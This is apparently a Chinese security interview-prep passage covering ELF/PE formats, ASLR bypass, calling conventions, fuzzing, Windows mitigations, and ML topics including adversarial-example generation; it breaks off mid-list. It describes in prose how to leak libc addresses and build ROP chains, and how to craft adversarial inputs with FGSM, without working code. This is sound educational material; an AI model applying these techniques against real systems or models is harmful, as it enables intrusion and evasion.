<p>程序头部表是一个描述所有段的数组。每个条目都是一个 <code>Elf64_Phdr</code> 结构体，它包含了每个段的类型、文件偏移、内存地址、大小和权限等信息。加载器通过遍历这个表，将 ELF 文件中的内容映射到内存中</p>
<ul>
<li><code>p_type</code>：段的类型，如 <code>PT_LOAD</code>（可加载到内存）</li>
<li><code>p_offset</code>：段在文件中的偏移量</li>
<li><code>p_vaddr</code>：段在内存中的虚拟地址</li>
<li><code>p_memsz</code>：段在内存中的大小</li>
<li><code>p_flags</code>：段的权限，如 <code>PF_R</code>（可读）、<code>PF_W</code>（可写）、<code>PF_X</code>（可执行）</li>
</ul>
<p><strong>ELF 文件加载过程</strong></p>
<ol>
<li>操作系统内核的加载器读取 ELF 头部，找到程序头部表</li>
<li>加载器遍历程序头部表中的所有条目</li>
<li>对于每个类型为 <code>PT_LOAD</code> 的段，加载器将文件中的相应部分，从 <code>p_offset</code> 偏移处开始，映射到内存中的 <code>p_vaddr</code> 虚拟地址上</li>
<li>加载器根据 <code>p_flags</code> 设置内存页的权限（读、写、执行）</li>
<li>所有段加载完毕后，加载器将程序控制权交给 <code>e_entry</code> 字段指定的入口点地址，程序开始执行</li>
</ol>
<hr>
<h3 id="讲讲-Windows-平台的-PE-文件结构"><a href="#讲讲-Windows-平台的-PE-文件结构" class="headerlink" title="讲讲 Windows 平台的 PE 文件结构"></a>讲讲 Windows 平台的 PE 文件结构</h3><p><strong>PE 文件的双重性质</strong></p>
<p>PE 文件的结构可以看作是<strong>DOS 文件</strong>和 <strong>PE 文件</strong>的结合体。这种设计是为了保持与旧版 DOS 操作系统的兼容性。当你双击一个 PE 文件时，操作系统首先会将其作为一个 DOS 程序处理</p>
<p>PE 文件主要由以下几个核心部分组成：</p>
<ol>
<li><strong>DOS 头部 (DOS Header)</strong></li>
<li><strong>DOS Stub (DOS 存根)</strong></li>
<li><strong>NT 头部 (NT Header)</strong></li>
<li><strong>可选头部 (Optional Header)</strong></li>
<li><strong>节表 (Section Table)</strong></li>
<li><strong>节 (Sections)</strong></li>
</ol>
<p><strong>1. DOS 头部 (DOS Header)</strong></p>
<p>这是 PE 文件的最前端，一个 <code>IMAGE_DOS_HEADER</code> 结构体</p>
<ul>
<li><strong><code>e_magic</code></strong>：4 字节的魔数，固定为 <code>0x4D5A</code> (ASCII 字符 <strong>“MZ”</strong>)。这是识别 PE 文件的标志</li>
<li><strong><code>e_lfanew</code></strong>：一个关键的字段，它是一个 4 字节的偏移量，指向 <strong>NT 头部</strong>的起始位置</li>
</ul>
<p><strong>2. DOS Stub (DOS 存根)</strong></p>
<p>这是一个小型的 DOS 程序。当在 DOS 环境下执行这个文件时，它会打印一句经典的提示语：“This program cannot be run in DOS mode.”。它的唯一作用就是为了兼容性</p>
<p><strong>3. NT 头部 (NT Header)</strong></p>
<p>NT 头部是 PE 文件的真正核心，它是一个 <code>IMAGE_NT_HEADERS</code> 结构体，由三个部分组成：</p>
<ul>
<li><strong><code>Signature</code></strong>：4 字节的签名，固定为 <code>0x50450000</code> (ASCII 字符 <strong>“PE\0\0”</strong>)。这标志着它是一个有效的 PE 文件</li>
<li><strong><code>FileHeader</code> (文件头部)</strong>：一个 <code>IMAGE_FILE_HEADER</code> 结构体，包含了文件的基本属性，比如：<ul>
<li><strong><code>Machine</code></strong>：指定文件适用的 CPU 架构，如 <code>0x14C</code> (Intel 386)</li>
<li><strong><code>NumberOfSections</code></strong>：文件中包含的节的数量</li>
<li><strong><code>SizeOfOptionalHeader</code></strong>：可选头部的大小</li>
<li><strong><code>Characteristics</code></strong>：文件的特性，如是否是可执行文件、是否是 DLL 等</li>
</ul>
</li>
<li><strong><code>OptionalHeader</code> (可选头部)</strong>：一个 <code>IMAGE_OPTIONAL_HEADER</code> 结构体，这部分虽然叫“可选”，但对于可执行文件来说是必需的。它包含了加载器需要的大部分信息，是理解 PE 结构的关键</li>
</ul>
<p><strong>4. 可选头部 (Optional Header)</strong></p>
<p>可选头部包含了 PE 文件的加载信息，例如：</p>
<ul>
<li><strong><code>Magic</code></strong>：标志着文件是 32 位 (<code>0x10B</code>) 还是 64 位 (<code>0x20B</code>)</li>
<li><strong><code>AddressOfEntryPoint</code></strong>：程序的入口点地址，它是一个 <strong>RVA (Relative Virtual Address)</strong>。当文件加载后，加载器会将控制权交给这个地址</li>
<li><strong><code>ImageBase</code></strong>：程序加载到内存中的首选基址</li>
<li><strong><code>SectionAlignment</code></strong> 和 <strong><code>FileAlignment</code></strong>：内存中和文件中的节对齐粒度</li>
<li><strong><code>SizeOfImage</code></strong>：整个文件被加载到内存后占用的总大小</li>
<li><strong><code>DataDirectory</code> (数据目录)</strong>：这是最重要的部分之一，一个 <code>IMAGE_DATA_DIRECTORY</code> 结构体数组。它包含了 PE 文件中各种重要数据结构的位置和大小，例如：<ul>
<li><strong><code>Import Table</code> (导入表)</strong>：记录了程序依赖的 DLL 和从中导入的函数。加载器在运行时会根据这个表填充函数的真实地址</li>
<li><strong><code>Export Table</code> (导出表)</strong>：记录了 DLL 文件中供其他程序调用的函数</li>
<li><strong><code>Resource Table</code> (资源表)</strong>：包含了图标、光标、菜单、对话框等资源数据</li>
<li><strong><code>Base Relocation Table</code> (基址重定位表)</strong>：当文件无法加载到其首选基址时，需要进行重定位，这个表记录了所有需要修正的地址</li>
<li><strong><code>TLS Table</code> (线程本地存储表)</strong>：记录了线程相关的数据</li>
<li><strong><code>Debug Directory</code> (调试目录)</strong>：指向调试信息</li>
</ul>
</li>
</ul>
<p><strong>5. 节表 (Section Table)</strong></p>
<p>紧跟在可选头部后面的是节表。这是一个 <code>IMAGE_SECTION_HEADER</code> 结构体数组，数组中的每个结构体都描述了一个<strong>节</strong></p>
<ul>
<li><strong><code>Name</code></strong>：节的名称，如 <code>.text</code>, <code>.data</code>, <code>.rdata</code> 等</li>
<li><strong><code>VirtualAddress</code></strong>：该节在内存中的 RVA</li>
<li><strong><code>SizeOfRawData</code></strong>：该节在文件中的大小</li>
<li><strong><code>PointerToRawData</code></strong>：该节在文件中的偏移量</li>
<li><strong><code>Characteristics</code></strong>：节的属性，例如<strong>可读、可写、可执行</strong>等权限</li>
</ul>
<p><strong>6. 节 (Sections)</strong></p>
<p>节是 PE 文件中包含实际数据和代码的区域。它们是根据功能和权限来划分的。常见的节有：</p>
<ul>
<li><strong><code>.text</code></strong>：包含可执行代码和只读数据。在内存中通常具有<strong>只读和可执行</strong>权限</li>
<li><strong><code>.data</code></strong>：包含已初始化的全局变量和静态变量。在内存中通常具有<strong>可读和可写</strong>权限</li>
<li><strong><code>.rdata</code></strong>：包含只读数据，如字符串常量、导入表、导出表等。在内存中通常具有<strong>只读</strong>权限</li>
<li><strong><code>.idata</code></strong>：导入表</li>
<li><strong><code>.edata</code></strong>：导出表</li>
<li><strong><code>.rsrc</code></strong>：资源数据，如图标和位图</li>
<li><strong><code>.reloc</code></strong>：基址重定位表</li>
</ul>
<p><strong>PE 文件加载过程</strong></p>
<p>当 Windows 加载器加载一个 PE 文件时，它会：</p>
<ol>
<li><strong>检查 DOS 头部和 NT 头部</strong>，确认文件是有效的 PE 格式</li>
<li><strong>根据可选头部中的 <code>ImageBase</code> 和 <code>SizeOfImage</code></strong> 为程序在内存中分配虚拟地址空间</li>
<li><strong>遍历节表</strong>，将文件中的各个节根据其在文件中的偏移和在内存中的 RVA，映射到先前分配的内存空间中</li>
<li><strong>处理导入表</strong>，将程序依赖的 DLL 加载到内存，并填充导入表中的函数地址</li>
<li><strong>如果文件无法加载到其首选基址</strong>，加载器会处理基址重定位表，修正所有需要调整的地址</li>
<li><strong>将控制权转移到入口点</strong> (<code>AddressOfEntryPoint</code>)，程序开始执行</li>
</ol>
<hr>
<h3 id="讲讲-ASLR-怎么绕过"><a href="#讲讲-ASLR-怎么绕过" class="headerlink" title="讲讲 ASLR 怎么绕过"></a>讲讲 ASLR 怎么绕过</h3><p><strong>ASLR 的核心思想</strong></p>
<p>首先，我们简要回顾一下 ASLR 的原理。ASLR 是一种<strong>漏洞缓解机制</strong>，它的核心思想是<strong>将程序在内存中的关键区域（如可执行文件、共享库、堆和栈）加载到随机的地址</strong></p>
<p>没有 ASLR 时，每次运行程序，其内存布局都是固定的。攻击者可以精确地预测函数和变量的地址，然后利用漏洞（如缓冲区溢出）来劫持程序流，跳转到这些预先知道的地址</p>
<p>有了 ASLR，程序每次运行时地址都会变化，攻击者无法再依赖硬编码的地址，这大大增加了攻击的难度</p>
<p><strong>绕过 ASLR 的基本思路</strong></p>
<p>ASLR 依赖于<strong>地址的保密性</strong>。如果攻击者能够泄露（也就是获得）任何一个模块的真实地址，那么 ASLR 就会失效。这是因为一个模块内部的相对偏移（RVA）是固定的。一旦知道了一个函数的真实地址，攻击者就可以通过这个地址减去其 RVA，得到模块的基址，进而计算出该模块中所有其他函数和数据的位置</p>
<p>因此，绕过 ASLR 的核心思路就是<strong>信息泄露</strong></p>
<p><strong>常见绕过 ASLR 的技术</strong></p>
<p>以下是一些最常见的绕过 ASLR 的技术，从简单到复杂</p>
<p><strong>1. 信息泄露漏洞</strong></p>
<p>这是最直接的绕过方式。如果程序本身存在一个信息泄露漏洞，攻击者就可以利用它来获得内存中的地址</p>
<ul>
<li><strong>格式化字符串漏洞（Format String Bug）：</strong> 攻击者可以利用 <code>%p</code> 格式符来打印栈上的指针。如果栈上恰好有一个指向模块基址或函数地址的指针，攻击者就可以轻松获得这些关键地址</li>
<li><strong>堆溢出或栈溢出：</strong> 如果攻击者能够通过溢出漏洞读取栈或堆上的数据，他们可能会读出函数返回地址、栈指针或堆块指针，这些指针都包含有地址信息</li>
<li><strong>未初始化变量：</strong> 如果一个变量没有初始化，它可能包含之前内存中的残余数据，而这些残余数据可能恰好是一个地址</li>
</ul>
<p><strong>如何利用：</strong></p>
<ol>
<li>利用信息泄露漏洞获得某个函数的真实地址，比如 <code>puts()</code> 的地址</li>
<li>通过 <code>puts()</code> 的地址，计算出 <code>libc</code> 库的基址（<code>puts_addr - puts_libc_offset = libc_base</code>）</li>
<li>有了 <code>libc</code> 的基址，就可以计算出 <code>system()</code> 函数和字符串 <code>&quot;/bin/sh&quot;</code> 的地址，从而构造 ROP 链来执行 Shellcode</li>
</ol>
<p><strong>2. 局部 ASLR 绕过</strong></p>
<p>某些系统或老旧的程序只对部分内存区域进行了 ASLR 随机化，或者随机化范围非常小</p>
<ul>
<li><strong>弱 ASLR：</strong> 32 位系统上的 ASLR 随机化范围通常只有 16 位（64KB）。攻击者可以通过暴力破解或多次尝试来命中正确的地址，这被称为<strong>暴力破解攻击（Brute-force Attack）</strong></li>
</ul>
<p><strong>3. 非随机化区域利用</strong></p>
<p>有些程序或系统组件没有启用 ASLR 保护，它们总会被加载到固定的地址。攻击者可以利用这些非随机化区域作为跳板</p>
<ul>
<li><strong>静态编译的程序：</strong> 如果一个程序是静态编译的，不依赖任何共享库，那么它的所有代码和数据都在一个文件中。即使开启了 ASLR，其自身的基址是随机化的，但如果攻击者能够泄露出一个地址，就能推算出所有其他地址</li>
<li><strong>禁用 ASLR 的模块：</strong> 有些老旧的 DLL 可能没有启用 ASLR 编译。这些模块每次都会被加载到固定地址，攻击者可以直接利用其中的 gadgets 或函数</li>
</ul>
<p><strong>4. 通过其他漏洞组合绕过</strong></p>
<p>ASLR 很少被单独绕过，通常需要与其他漏洞（如代码执行漏洞）结合使用</p>
<ul>
<li><strong>Return-to-PLT&#x2F;GOT：</strong> 攻击者可以利用漏洞劫持程序流，跳转到 GOT（Global Offset Table）中一个已解析的函数地址。因为 GOT 存放的是外部函数的真实地址，通过读取这个地址，攻击者就能获得 <code>libc</code> 等共享库的基址</li>
<li><strong>ROP Gadget 寻找：</strong> 在没有信息泄露漏洞的情况下，攻击者可以使用<strong>多次尝试</strong>或<strong>堆喷射</strong>等技术。在现代 64 位系统上，ASLR 随机化范围很大，暴力破解几乎不可行。所以，信息泄露是绕过 ASLR 的首选方式</li>
</ul>
<hr>
<h3 id="函数的调用约定有哪些，区别是什么"><a href="#函数的调用约定有哪些，区别是什么" class="headerlink" title="函数的调用约定有哪些，区别是什么"></a>函数的调用约定有哪些，区别是什么</h3><p><strong>1. <code>cdecl</code> (C Declaration)</strong></p>
<p>这是 C 语言的默认调用约定，也是最常见的</p>
<ul>
<li><strong>参数传递</strong>：从<strong>右到左</strong>依次推入栈中</li>
<li><strong>栈清理</strong>：由**调用方（caller）**负责在函数返回后清理栈</li>
<li><strong>寄存器</strong>：<code>eax</code>, <code>ecx</code>, <code>edx</code> 是调用方保存的（caller-saved）寄存器。这意味着被调用函数可以自由使用这些寄存器，如果调用方需要保存它们，需要在调用前自己推入栈中</li>
</ul>
<p><strong>优点</strong>：支持可变参数函数，例如 <code>printf</code></p>
<p><strong>缺点</strong>：每次函数调用后都需要调用方执行额外的栈清理指令，会增加代码大小</p>
<p><strong>2. <code>stdcall</code> (Standard Call)</strong></p>
<p>这是 Windows API 的默认调用约定</p>
<ul>
<li><strong>参数传递</strong>：从<strong>右到左</strong>依次推入栈中</li>
<li><strong>栈清理</strong>：由**被调用方（callee）**负责清理栈</li>
<li><strong>寄存器</strong>：与 <code>cdecl</code> 类似</li>
</ul>
<p><strong>优点</strong>：代码更精简。由于被调用方知道参数数量，只需一条指令即可清理栈</p>
<p> <strong>缺点</strong>：不支持可变参数函数，因为被调用方需要知道参数数量才能正确清理栈</p>
<p><strong>3. <code>fastcall</code></strong></p>
<p>这是一个为了提高性能而设计的调用约定</p>
<ul>
<li><strong>参数传递</strong>：前两个（或更多，具体取决于编译器和架构）参数通过<strong>寄存器</strong>传递，而不是通过栈。其余参数从右到左推入栈中</li>
<li><strong>栈清理</strong>：由<strong>被调用方</strong>清理栈</li>
<li><strong>寄存器</strong>：使用 <code>ecx</code> 和 <code>edx</code>（在 32 位 Windows 上）或 <code>rcx</code> 和 <code>rdx</code>（在 64 位 Windows 上）来传递前两个参数</li>
</ul>
<p><strong>优点</strong>：通过减少内存访问（栈操作）来提高函数调用速度</p>
<p> <strong>缺点</strong>：不支持可变参数函数</p>
<p><strong>4. <code>thiscall</code></strong></p>
<p>这是 C++ 中非静态成员函数的默认调用约定</p>
<ul>
<li><strong>参数传递</strong>：与 <code>cdecl</code> 或 <code>stdcall</code> 类似，但隐藏的 <code>this</code> 指针（指向对象实例）通过<strong>寄存器</strong>传递</li>
<li><strong>栈清理</strong>：由<strong>被调用方</strong>清理栈</li>
</ul>
<p><strong>优点</strong>：优化了 C++ 成员函数的调用</p>
<p> <strong>缺点</strong>：只能用于 C++ 成员函数</p>
<p><strong>5. <code>pascal</code> (Pascal Language)</strong></p>
<p>在老旧的 Windows 16 位编程中很常见，现在很少使用</p>
<ul>
<li><strong>参数传递</strong>：从<strong>左到右</strong>推入栈中</li>
<li><strong>栈清理</strong>：由<strong>被调用方</strong>清理栈</li>
</ul>
<p><strong>不同平台下的调用约定</strong></p>
<ul>
<li><p><strong>Windows (x86)</strong>：</p>
<ul>
<li><code>cdecl</code>：C&#x2F;C++ 默认</li>
<li><code>stdcall</code>：Windows API 默认</li>
<li><code>fastcall</code>：用于性能优化</li>
<li><code>thiscall</code>：C++ 成员函数</li>
</ul>
</li>
<li><p><strong>Windows (x64)</strong>：</p>
<ul>
<li><code>__fastcall</code>：这是 64 位 Windows 的唯一调用约定。前四个整数或指针参数通过 <code>rcx</code>, <code>rdx</code>, <code>r8</code>, <code>r9</code> 寄存器传递。其余参数从右到左推入栈中</li>
</ul>
</li>
<li><p><strong>Linux (x86)</strong>：</p>
<ul>
<li><code>cdecl</code>：默认</li>
</ul>
</li>
<li><p><strong>Linux (x64)</strong>：</p>
<ul>
<li>前六个整数或指针参数通过 <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code> 寄存器传递。其余参数从右到左推入栈中</li>
</ul>
<hr>
<h3 id="fuzzing-主要是用来干嘛"><a href="#fuzzing-主要是用来干嘛" class="headerlink" title="fuzzing 主要是用来干嘛"></a>fuzzing 主要是用来干嘛</h3></li>
</ul>
<p><strong>1. 探索代码路径（Code Coverage）</strong></p>
<p>Fuzzing 的一个核心目标是最大化代码覆盖率。传统的测试可能只会测试程序的“阳光大道”，而 fuzzing 则会试图探索那些不寻常的、可能存在漏洞的角落</p>
<p>例如，一个<strong>覆盖率引导的 fuzzer</strong>（如 AFL 或 LibFuzzer）会记录下每个输入所执行的代码路径。如果一个新的输入能够触发一条未曾被执行过的代码路径，fuzzer 就会将这个输入保留下来，并对其进行变异，以期能更深入地探索该路径。这种方法使得 fuzzer 能够自动绕过复杂的逻辑检查，深入到程序的核心功能中去</p>
<p><strong>2. 内存安全漏洞检测</strong></p>
<p>许多安全漏洞都与内存操作有关，比如：</p>
<ul>
<li><strong>缓冲区溢出</strong>：向一个固定大小的缓冲区写入了超过其容量的数据，导致相邻的内存区域被覆盖</li>
<li><strong>空指针解引用</strong>：程序试图访问一个空指针指向的内存</li>
<li><strong>整数溢出</strong>：在进行算术运算时，结果超出了变量类型的最大值，导致意外的结果</li>
</ul>
<p>Fuzzing 工具通过监控程序的<strong>内存访问行为</strong>来检测这些漏洞。例如，fuzzer 可以使用 Sanitizer 工具（如 AddressSanitizer、MemorySanitizer）来在运行时追踪内存读写，一旦发现非法访问，就会立即报告</p>
<p><strong>3. 绕过输入验证</strong></p>
<p>攻击者通常需要绕过程序的输入验证逻辑才能触发漏洞。从二进制角度来看，fuzzing 能够通过<strong>变异输入的字节</strong>来绕过这些验证</p>
<p>例如，一个网络协议解析器可能期望数据包的某个字段是一个特定的值。Fuzzer 会随机改变这个字段的字节，并观察解析器的行为。如果变异后的数据包导致程序进入一个异常状态，fuzzer 就找到了一个潜在的漏洞</p>
<hr>
<h3 id="对-Windows-平台的漏洞和保护机制了解多少"><a href="#对-Windows-平台的漏洞和保护机制了解多少" class="headerlink" title="对 Windows 平台的漏洞和保护机制了解多少"></a>对 Windows 平台的漏洞和保护机制了解多少</h3><p><strong>常见的 Windows 漏洞类型</strong></p>
<p>理解 Windows 漏洞首先要从其根源——软件缺陷说起。以下是一些最常见、最危险的漏洞类型：</p>
<ul>
<li><strong>缓冲区溢出 (Buffer Overflows)</strong>：这是最经典的漏洞类型。当程序向一个固定大小的缓冲区写入的数据超过其容量时，多余的数据会覆盖相邻的内存，比如函数返回地址或栈上的其他数据。攻击者可以利用这一点来劫持程序执行流程<ul>
<li><strong>栈溢出 (Stack Overflows)</strong>：发生在栈上，通常用于劫持函数返回地址</li>
<li><strong>堆溢出 (Heap Overflows)</strong>：发生在堆上，比栈溢出更复杂，但同样危险，通常用于修改关键数据结构或函数指针</li>
</ul>
</li>
<li><strong>整数溢出 (Integer Overflows)</strong>：当一个整数运算的结果超出其数据类型的最大值时，会发生溢出，导致非预期的结果。攻击者可以利用整数溢出绕过大小检查，比如分配一个远小于所需内存的缓冲区，然后触发缓冲区溢出</li>
<li><strong>格式化字符串漏洞 (Format String Bugs)</strong>：当程序使用 <code>printf</code> 等函数时，如果攻击者能控制格式化字符串，他们就可以利用 <code>%p</code>, <code>%n</code> 等格式符来读取栈上的数据（信息泄露）或向任意地址写入数据。这种漏洞通常用于绕过 ASLR</li>
<li><strong>UAF (Use-After-Free)</strong>：当程序释放一块内存后，仍然继续使用这个指针。攻击者可以利用这个时间差，在这块内存被重新分配给其他数据后，通过旧指针访问或修改新数据，从而达到执行任意代码的目的</li>
<li><strong>竞态条件 (Race Conditions)</strong>：当两个或多个线程在没有适当同步的情况下，竞争访问和修改共享资源时，可能会导致意外的结果。攻击者可以利用这种不确定性来触发漏洞，例如在程序检查完权限后，但在执行操作前，快速修改一个文件</li>
</ul>
<p><strong>Windows 平台的漏洞保护机制</strong></p>
<p>为了对抗这些漏洞，微软在 Windows 操作系统和编译器中集成了一系列强大的漏洞缓解机制。这些机制不会修复漏洞本身，但会大大增加攻击的难度</p>
<ul>
<li><strong>数据执行保护 (Data Execution Prevention, DEP)</strong>：这是最基本的保护机制之一，也称 <strong>NX 位（No-eXecute）</strong>。它将内存页标记为<strong>不可执行</strong>，以防止攻击者在数据段（如堆和栈）上执行恶意代码。为了绕过 DEP，攻击者必须使用<strong>代码重用技术</strong>，比如 ROP</li>
<li><strong>地址空间布局随机化 (Address Space Layout Randomization, ASLR)</strong>：ASLR 会将可执行文件、DLL、堆和栈等关键内存区域随机加载到不同的地址。这使得攻击者无法预测函数和变量的精确位置，从而让传统的缓冲区溢出攻击失效。ASLR 的主要弱点是<strong>信息泄露漏洞</strong>，攻击者可以通过它来获取关键地址，从而绕过 ASLR</li>
<li><strong>栈保护 (Stack Canaries)</strong>：也称为 SSP (Stack Smashing Protection)。编译器在函数返回地址之前插入一个随机的“金丝雀值”。在函数返回前，程序会检查这个值是否被修改。如果被修改，就说明发生了栈溢出，程序会立即终止</li>
<li><strong>控制流防护 (Control Flow Guard, CFG)</strong>：CFG 是一个更高级的保护机制，旨在对抗 ROP 攻击。它通过在编译器和操作系统层面创建和验证一个合法的间接调用地址列表。在运行时，它会检查所有的间接函数调用，如果目标地址不在这个合法列表中，就会阻止调用</li>
<li><strong>SEHOP (Structured Exception Handling Overwrite Protection)</strong>：SEHOP 是一种针对 SEH 覆盖漏洞的保护。它通过在异常处理链的末尾插入一个特殊的指针来验证链的完整性。如果攻击者试图覆盖 SEH 链，这个验证就会失败，阻止攻击</li>
<li><strong>SafeSEH</strong>：在编译时，SafeSEH 会生成一个合法的异常处理函数列表。在运行时，操作系统会验证异常处理函数的地址是否在列表中。这防止了攻击者利用非法的异常处理函数来劫持程序流</li>
</ul>
<h1 id="28-AI安全"><a href="#28-AI安全" class="headerlink" title="28- AI安全"></a>28- AI安全</h1><h3 id="介绍下-SVM"><a href="#介绍下-SVM" class="headerlink" title="介绍下 SVM"></a>介绍下 SVM</h3><p><strong>SVM 的核心思想：寻找最佳分隔超平面</strong></p>
<p>想象一下，你有一堆红色的球和蓝色的球，你想用一根线把它们分开。你可以画出无数条线，但哪条线是最好的呢？</p>
<p>SVM 的答案是：那条离<strong>最近</strong>的红色球和蓝色的球都最远的线</p>
<p>在二维空间中，这个“线”就是一个<strong>分隔平面</strong>（Separating Plane）。在三维空间中，它是一个平面。在更高维度的空间中，我们称它为<strong>超平面</strong>（Hyperplane）</p>
<ul>
<li><strong>支持向量（Support Vectors）</strong>：这些“最近”的数据点就是<strong>支持向量</strong>。它们是距离超平面最近的那些训练样本点，它们决定了超平面的位置。如果移除或移动这些支持向量，超平面的位置可能会发生变化。但如果移动那些离超平面很远的数据点，超平面则保持不变</li>
<li><strong>最大间隔（Maximal Margin）</strong>：超平面到最近支持向量的距离被称为<strong>间隔</strong>（Margin）。SVM 的目标就是找到一个超平面，使得这个间隔最大化。这个最大间隔的超平面就是最优超平面</li>
</ul>
<p><strong>线性可分与非线性可分</strong></p>
<p><strong>1. 线性可分（Linear SVM）</strong></p>
<p>当数据可以被一条直线（或一个超平面）完美分开时，我们称其为<strong>线性可分</strong>。在这种情况下，我们可以直接使用上面提到的最大间隔方法来找到最优超平面。</p>
<p><strong>2. 非线性可分（Kernel SVM）</strong></p>
<p>大多数情况下，数据点并非线性可分。例如，红色球和蓝色球可能混合在一起，你无法用一条直线将它们完全分开</p>
<p>这就是 SVM 强大之处的体现：<strong>核技巧</strong>（Kernel Trick）</p>
<p>核技巧的核心思想是，将原始的低维数据<strong>映射</strong>到一个更高维度的空间，在这个高维空间中，数据变得<strong>线性可分</strong>了</p>
<p>举个例子：一个二维的圆环，内圈是蓝色，外圈是红色。在二维平面上，你无法用一条直线将它们分开。但是，如果我们将这些点映射到三维空间，它们可能就会在一个平面上呈“碗状”分布，这时我们就可以用一个平面将它们分开了</p>
<p>常用的核函数有：</p>
<ul>
<li><strong>线性核（Linear Kernel）</strong>：当数据本身线性可分时使用</li>
<li><strong>多项式核（Polynomial Kernel）</strong>：可以将低维数据映射到高维</li>
<li><strong>径向基函数核（RBF Kernel）</strong>：也叫高斯核，这是最常用、最强大的核函数之一，它能够将样本映射到无穷维度的空间，从而处理非常复杂的数据集</li>
</ul>
<p><strong>软间隔与惩罚参数 C</strong></p>
<p>在现实世界中，完美的分隔几乎不存在，数据集中往往会有一些“异常值”或“噪声”点，它们会混入另一个类别。如果我们坚持找到一个完美的超平面，模型可能会<strong>过拟合</strong></p>
<p>为了解决这个问题，SVM 引入了**软间隔（Soft Margin）**的概念。它允许一些数据点“越界”，即它们可以出现在间隔内部，甚至位于错误的一侧</p>
<ul>
<li><strong>惩罚参数 C（Penalty Parameter C）</strong>：这个参数用来控制<strong>容忍度</strong><ul>
<li><strong>C 值很小</strong>：模型容忍度高，允许更多数据点越界。这会使间隔更大，但可能会导致一些误分类，因此更不容易过拟合</li>
<li><strong>C 值很大</strong>：模型容忍度低，对错误分类的惩罚很高。这会使间隔变小，模型试图精确地分离所有训练数据，因此更容易过拟合</li>
</ul>
</li>
</ul>
<p>选择合适的 C 值是一个重要的调优步骤</p>
<hr>
<h3 id="如何降低模型的误报率"><a href="#如何降低模型的误报率" class="headerlink" title="如何降低模型的误报率"></a>如何降低模型的误报率</h3><p><strong>1. 调整决策阈值</strong></p>
<p>这是最直接、最常用的方法</p>
<ul>
<li><strong>原理</strong>：分类模型通常会输出一个概率值，例如，预测一个邮件是垃圾邮件的概率为0.8。我们设定一个<strong>决策阈值</strong>（比如0.5），如果概率高于这个阈值，就预测为“垃圾邮件”</li>
<li><strong>如何操作</strong>：为了降低误报率，我们可以<strong>提高这个决策阈值</strong>。如果我们将阈值从0.5提高到0.7，模型只有在对一个邮件有更高的信心时，才会将其标记为垃圾邮件。这样做会减少误报，但代价是可能会增加漏报（False Negative），即遗漏掉一些真正的垃圾邮件</li>
<li><strong>适用场景</strong>：当你更看重准确性（Precision）而不是召回率（Recall）时，例如在金融诈骗检测中，宁可漏掉一些诈骗，也不想错误地阻止用户的正常交易</li>
</ul>
<p><strong>2. 收集更多高质量的负样本</strong></p>
<p><strong>负样本</strong>（Negative Samples）指的是不属于你所关注的类别的样本</p>
<ul>
<li><strong>原理</strong>：模型之所以误报，是因为它可能没有见过足够多的负样本，或者负样本的种类太少，导致它对“负类别”的理解不够全面。当一个负样本的特征与正样本（你关注的类别）相似时，模型就很容易误判</li>
<li><strong>如何操作</strong>：<ul>
<li><strong>增加负样本数量</strong>：尽可能收集更多不属于目标类别的数据，让模型有更多机会去学习真正的“负类”是什么样的</li>
<li><strong>增加负样本多样性</strong>：特别关注那些容易被误报的**“困难负样本”**（Hard Negative Samples），并将它们加入训练集。这能强制模型学习更细粒度的边界，从而更好地区分正负样本</li>
</ul>
</li>
<li><strong>适用场景</strong>：当你的数据集存在严重的类别不平衡问题时</li>
</ul>
<p><strong>3. 重新设计特征</strong></p>
<p>模型的性能很大程度上取决于你给它什么样的数据</p>
<ul>
<li><strong>原理</strong>：如果模型总是误报某个特定类型的样本，很可能是因为当前的特征无法很好地区分这个样本和目标类别。</li>
<li><strong>如何操作</strong>：<ul>
<li><strong>添加新特征</strong>：思考并提取一些能更好地区分正负样本的新特征。例如，在垃圾邮件识别中，除了关键词，还可以加入发件人信誉度、邮件格式异常等特征</li>
<li><strong>特征选择</strong>：移除那些与目标无关或有误导性的特征，这可以帮助模型更专注于重要的信息</li>
</ul>
</li>
<li><strong>适用场景</strong>：当你发现模型的误报不是随机的，而是集中在某一类特定数据上时</li>
</ul>
<p><strong>4. 调整损失函数或使用惩罚项</strong></p>
<ul>
<li><strong>原理</strong>：标准的交叉熵损失函数对正负样本的错误预测给予相同的惩罚。为了降低误报，我们可以对误报（FP）给予更大的惩罚</li>
<li><strong>如何操作</strong>：<ul>
<li><strong>自定义损失函数</strong>：设计一个<strong>加权的损失函数</strong>，给误报（将负样本预测为正样本）赋予更高的权重，让模型在训练过程中更努力地避免这种错误</li>
<li><strong>Focal Loss</strong>：这是一种专门用于处理类别不平衡问题的损失函数，它能降低对那些易于分类的样本的权重，而更关注那些难以分类的样本，从而迫使模型去学习区分那些“困难”的负样本</li>
</ul>
</li>
<li><strong>适用场景</strong>：在类别极度不平衡，且误报代价极高的场景</li>
</ul>
<p><strong>5. 集成学习</strong></p>
<ul>
<li><strong>原理</strong>：集成学习通过结合多个模型的预测结果来提高整体性能。这可以减少单个模型因过拟合或对数据敏感而产生的误报</li>
<li><strong>如何操作</strong>：<ul>
<li><strong>投票法</strong>：训练多个不同的模型，让它们对同一个样本进行预测，最终由多数模型投票决定结果。这可以有效减少单个模型出错带来的影响</li>
<li><strong>提升法（Boosting）</strong>：如 <strong>LightGBM</strong> 或 <strong>XGBoost</strong>。这些算法会顺序地训练一系列弱分类器，每个后续分类器都会重点关注前一个分类器错误分类的样本，尤其是那些容易被误报的样本</li>
</ul>
</li>
<li><strong>适用场景</strong>：当你拥有足够的数据和计算资源来训练多个模型时</li>
</ul>
<hr>
<h3 id="如何找攻击样本"><a href="#如何找攻击样本" class="headerlink" title="如何找攻击样本"></a>如何找攻击样本</h3><p><strong>1. 基于梯度的攻击</strong></p>
<p>这是最常见、最基础的一类攻击方法，利用模型的梯度信息来生成扰动</p>
<ul>
<li><strong>原理</strong>：利用反向传播，计算损失函数相对于输入图像的梯度。这个梯度表示了如果对图像的像素进行微小改变，会如何影响模型的预测结果。通过沿着这个梯度方向对图像进行调整，可以最大化模型的损失，从而导致模型分类错误</li>
<li><strong>代表算法</strong>：<ul>
<li><strong>快速梯度符号法（FGSM, Fast Gradient Sign Method）</strong>：一种非常高效的单步攻击。它计算损失函数对输入图像的梯度，然后沿着梯度的正负号方向给图像加上一个微小的扰动</li>
